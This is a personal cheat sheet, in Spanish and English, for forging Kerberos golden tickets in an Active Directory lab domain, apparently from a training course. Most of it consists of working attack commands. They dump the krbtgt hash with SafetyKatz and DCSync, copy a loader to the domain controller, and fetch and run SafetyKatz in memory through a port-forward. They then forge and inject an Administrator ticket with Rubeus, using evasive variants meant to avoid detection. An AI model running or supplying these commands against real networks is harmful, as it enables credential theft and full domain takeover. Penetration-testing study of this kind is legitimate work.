# Golden Ticket  

Tags: #AD #Windows #Rubeus #Powershell #SafetyKatz 

```bash 
- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
- The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.
```

## SafetyKatz

```powershell 
❯ C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'    # Execute mimikatz (variant) on DC as DA to get krbtgt hash 

❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"       # Credential extraction 
 
❯ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"  # To use the DCSync feature for getting AES keys for krbtgt account, use this command with DA privileges 
```

## Rubeus 

```powershell
# Iniciar un proceso para obtener un cmd como svcadmin
❯ C:\AD\Rubeus.exe Arguments : asktgt /user:svcadmin /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt 

# Estraer los secretos con la nueva cmd haciendo un DCSync attack 
❯ C:\AD\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"  
```

```powershell 
# Otra forma de extraer los secretos del DC
❯ echo F | xcopy C:\AD\Loader.exe \\dcorp-dc\C$\User\Public\Loader.exe /Y  # Cargar el loader en el DC

❯ winrs -r:dcorp-dc cmd   # Conectarse al DC con svcadmin

❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=IP_WStudent  # Crear el portforwarding

❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit" # Descargar y ejecutar Safetikatz en memoria para obtener el hash ntlm del usuario krbtgt
```

```powershell 
# Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT con el usuario normal 'student'
❯ C:\AD\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd

# Es mejor hacerlo con Loader 
❯ C:\AD\Loader.exe -path C:\AD\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd

Notes:
	1. Above command generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve the values:
		1. To retrieve flags for user specified in /user.
		2. To retrieve /groups, /pgid, /minpassage and /maxpassage
		3. To retrieve /netbios of the current domain
	2. If you have already enumerated the above values, manually specify as many you can in the forging command (a bit more opsec friendly).
```

```powershell 
# The Golden ticket forging command looks like this:
❯ C:\AD\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD   # Inject the ticket in the current session 

# Con loader para inyectar el ticket en la sesión 
❯ C:\AD\Loader.exe -path C:\AD\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt  

# En la misma sesión de student conectarse al DC gracias al ticket importado
❯ winrs -r:dcorp-dc cmd 
	❯ set username       # Verificar el usuario que en este caso sería Administrator
	❯ set computername   # Verificar la máquina que sería dc-corp 
```

[![Golden-Ticket-Rubeus.png | 900](https://i.postimg.cc/TwC7VQBy/Golden-Ticket-Rubeus.png)](https://postimg.cc/WFqwjmNj)
[![Golden-Ticket-Rubeus2.png | 900 ](https://i.postimg.cc/0jjtcDqV/Golden-Ticket-Rubeus2.png)](https://postimg.cc/p5NYd9rj)

[![Golden-Ticket.png](https://i.postimg.cc/6pM86Jv4/Golden-Ticket.png)](https://postimg.cc/5XF4prpf)